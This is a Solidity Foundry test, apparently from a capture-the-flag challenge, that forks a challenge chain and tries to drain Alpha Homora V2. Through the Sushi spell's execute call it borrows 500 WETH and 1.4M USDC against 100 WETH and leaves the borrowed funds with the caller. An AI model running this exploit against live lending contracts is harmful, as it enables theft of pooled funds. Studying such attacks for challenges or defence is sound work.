// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20Attempt43 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHAttempt43 is IERC20Attempt43 {
    function deposit() external payable;
}

interface IHomoraBankAttempt43 {
    function execute(uint256 positionId, address spell, bytes calldata data) external payable returns (uint256);
    function getPositionInfo(uint256 positionId) external view returns (address owner, address collToken, uint256 collId, uint256 collSize);
    function getPositionDebts(uint256 positionId) external view returns (address[] memory tokens, uint256[] memory debts);
    function getCollateralETHValue(uint256 positionId) external view returns (uint256);
    function getBorrowETHValue(uint256 positionId) external view returns (uint256);
    function nextPositionId() external view returns (uint256);
    function feeBps() external view returns (uint256);
}

/// @notice Hypothesis: the live Alpha Homora V2 integration can still be abused through
/// the whitelisted Sushi spell, leaving borrowed WETH/USDC in the caller after `execute()`
/// while the debt is parked on the new Homora position and funded by Iron Bank's credit line.
contract Attempt43 is Test {
    address internal constant STUDENT = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    uint256 internal constant FORK_BLOCK = 14_684_704;
    uint256 internal constant EXPECTED_CHAIN_ID = 2401;

    IHomoraBankAttempt43 internal constant BANK = IHomoraBankAttempt43(0xba5eBAf3fc1Fcca67147050Bf80462393814E54B);
    address internal constant SPELL = 0xDc9c7A2Bae15dD89271ae5701a6f4DB147BAa44C;
    IWETHAttempt43 internal constant WETH = IWETHAttempt43(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Attempt43 internal constant USDC = IERC20Attempt43(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    uint256 internal constant USER_WETH = 100 ether;
    uint256 internal constant BORROW_WETH = 500 ether;
    uint256 internal constant BORROW_USDC = 1_400_000e6;

    function setUp() public {
        vm.createSelectFork("ch3", FORK_BLOCK);

        vm.label(STUDENT, "StudentEOA");
        vm.label(address(BANK), "AlphaHomoraBank");
        vm.label(SPELL, "SushiSpell");
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
    }

    function test_alpha_homora_credit_line_behavior() public {
        uint256 startPositionId = BANK.nextPositionId();
        uint256 startEth = STUDENT.balance;
        uint256 startWeth = WETH.balanceOf(STUDENT);
        uint256 startUsdc = USDC.balanceOf(STUDENT);

        console.log("CHAIN_ID:", block.chainid);
        console.log("FORK_BLOCK:", block.number);
        console.log("BANK_FEE_BPS:", BANK.feeBps());
        console.log("START_POSITION_ID:", startPositionId);
        console.log("STUDENT_ETH_BEFORE:", startEth);
        console.log("STUDENT_WETH_BEFORE:", startWeth);
        console.log("STUDENT_USDC_BEFORE:", startUsdc);

        assertEq(block.chainid, EXPECTED_CHAIN_ID, "unexpected challenge chain id");

        vm.startPrank(STUDENT, STUDENT);

        WETH.deposit{value: USER_WETH}();
        require(WETH.approve(address(BANK), type(uint256).max), "approve bank WETH failed");
        require(USDC.approve(address(BANK), type(uint256).max), "approve bank USDC failed");

        bytes memory spellData = abi.encodeWithSelector(
            bytes4(0xe07d904e),
            address(WETH),
            address(USDC),
            USER_WETH,
            0,
            0,
            BORROW_WETH,
            BORROW_USDC,
            0,
            0,
            0,
            uint256(1)
        );

        uint256 positionId = BANK.execute(0, SPELL, spellData);
        vm.stopPrank();

        (address owner, address collToken, uint256 collId, uint256 collSize) = BANK.getPositionInfo(positionId);
        (address[] memory debtTokens, uint256[] memory debts) = BANK.getPositionDebts(positionId);

        uint256 endEth = STUDENT.balance;
        uint256 endWeth = WETH.balanceOf(STUDENT);
        uint256 endUsdc = USDC.balanceOf(STUDENT);

        console.log("POSITION_ID:", positionId);
        console.log("POSITION_OWNER:", owner);
        console.log("POSITION_COLLATERAL_TOKEN:", collToken);
        console.log("POSITION_COLLATERAL_ID:", collId);
        console.log("POSITION_COLLATERAL_SIZE:", collSize);
        console.log("POSITION_COLLATERAL_ETH_VALUE:", BANK.getCollateralETHValue(positionId));
        console.log("POSITION_BORROW_ETH_VALUE:", BANK.getBorrowETHValue(positionId));
        console.log("DEBT_TOKEN_COUNT:", debtTokens.length);
        for (uint256 i = 0; i < debtTokens.length; ++i) {
            console.log("DEBT_TOKEN:", debtTokens[i]);
            console.log("DEBT_AMOUNT:", debts[i]);
        }
        console.log("STUDENT_ETH_AFTER:", endEth);
        console.log("STUDENT_WETH_AFTER:", endWeth);
        console.log("STUDENT_USDC_AFTER:", endUsdc);
        console.log("STUDENT_WETH_DELTA:", endWeth - startWeth);
        console.log("STUDENT_USDC_DELTA:", endUsdc - startUsdc);

        assertEq(owner, STUDENT, "unexpected position owner");
        assertGt(positionId, 0, "position not created");
    }
}
